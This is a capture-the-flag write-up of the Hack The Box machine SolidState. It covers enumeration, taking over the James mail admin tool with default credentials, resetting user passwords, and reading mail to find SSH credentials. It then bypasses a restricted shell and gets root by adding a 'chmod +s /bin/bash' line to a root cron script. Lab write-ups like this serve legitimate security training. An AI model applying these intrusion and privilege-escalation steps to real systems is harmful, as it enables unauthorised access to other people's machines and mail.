---
icon: ubuntu
---

# SolidState - Medium

<figure><img src="../../.gitbook/assets/image (3369).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/solidstate"><strong>SolidState</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP scan" overflow="wrap" expandable="true" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.11.233 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 12:22 -0400
Nmap scan report for 10.129.11.233
Host is up (0.031s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   86.04 ms 10.10.16.1
2   24.72 ms 10.129.11.233
```
{% endcode %}

The one port that stands out to me right away is 4555. I am going to try banner grabbing

{% code title="Port 4555 Banner Grabbing" overflow="wrap" expandable="true" %}
```shellscript
nc 10.129.11.233 4555
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3370).png" alt=""><figcaption></figcaption></figure>

I played around with a couple of keywords and managed to trigger a response.

### <mark style="color:blue;">James Remote Administration Tool 2.3.2</mark>

A quick google search led me to some admin default creds that worked here

<figure><img src="../../.gitbook/assets/image (3371).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/smtp/apache_james_exec.md" %}

<figure><img src="../../.gitbook/assets/image (3372).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3373).png" alt=""><figcaption></figcaption></figure>

wow there is a lot of stuff we can do here. I'll start by listing the users

<figure><img src="../../.gitbook/assets/image (3374).png" alt=""><figcaption></figcaption></figure>

Alright we got a list of users, whose passwords we do not know. Luckily we can change there passwords!

I am going to change every user's password to their username

<figure><img src="../../.gitbook/assets/image (3375).png" alt=""><figcaption></figcaption></figure>

No we have 3 other Ports that we can check for information

* **SMTP (port 25)** — for sending mail
* **POP3 (port 110)** — for retrieving mail
* **NNTP (port 119)** — for network news

Let's check thei users mail via POP3

<figure><img src="../../.gitbook/assets/image (3376).png" alt=""><figcaption></figcaption></figure>

James is empty, so is thomas

<figure><img src="../../.gitbook/assets/image (3377).png" alt=""><figcaption></figcaption></figure>

john's on the other hand isn't it seems like mindy is going to receive a temporary password from mailadmin. Let's check it out

<figure><img src="../../.gitbook/assets/image (3379).png" alt=""><figcaption></figcaption></figure>

Mindy has got 2 mails!

<figure><img src="../../.gitbook/assets/image (3378).png" alt=""><figcaption></figcaption></figure>

The first one is a welcoming message

<figure><img src="../../.gitbook/assets/image (3380).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" expandable="true" %}
```shellscript
mindy:P@55W0rd1!2@
```
{% endcode %}

In the second one we have some ssh credentials. Let's see if they are still valid

<figure><img src="../../.gitbook/assets/image (3381).png" alt=""><figcaption></figcaption></figure>

And they are!

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as Mindy</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
ssh mindy@10.129.11.233
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3384).png" alt=""><figcaption></figcaption></figure>

What the penguin is this limited shell, the only commands available to us are cd, env and ls

<figure><img src="../../.gitbook/assets/image (3385).png" alt=""><figcaption></figcaption></figure>

I should have read the whole email :smile:&#x20;

<figure><img src="../../.gitbook/assets/image (3382).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Bypassing Restricted Shell</mark>

This [**article**](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/) offers us a way to bypass our restricted shell using ssh

{% code overflow="wrap" expandable="true" %}
```shellscript
ssh mindy@10.10.10.51 -t "bash --noprofile"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3386).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Manual Enumeration</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
find / -user root -perm -002 -type f 2>/dev/null
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3387).png" alt=""><figcaption></figcaption></figure>

I like to run this command during manual enumeration. Because it shows files that are owned by root and writble by me. I found an interesting file in /opt I'll take a look at it.

{% code title="/opt/tmp.py" overflow="wrap" expandable="true" %}
```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```
{% endcode %}

The script isn't doing much, it looks like a script that is made to run on a schedule. I'll run pspy on the machine and see.

{% code overflow="wrap" expandable="true" %}
```shellscript
lscpu
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3388).png" alt=""><figcaption></figcaption></figure>

Checking the architecture it looks like x32 so will need pspy32

<figure><img src="../../.gitbook/assets/image (3389).png" alt=""><figcaption></figcaption></figure>

We can see the script being run by the root user every couple of minutes!

I'll modify the file and have it set the SUID to `/bin/bash` for easy privesc

{% code title="/opt/tmp.py" overflow="wrap" expandable="true" %}
```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
os.system('chmod +s /bin/bash')
```
{% endcode %}

After you modify the file wait a bit and the SUID should be set on `/bin/bash`

<figure><img src="../../.gitbook/assets/image (3390).png" alt=""><figcaption></figcaption></figure>
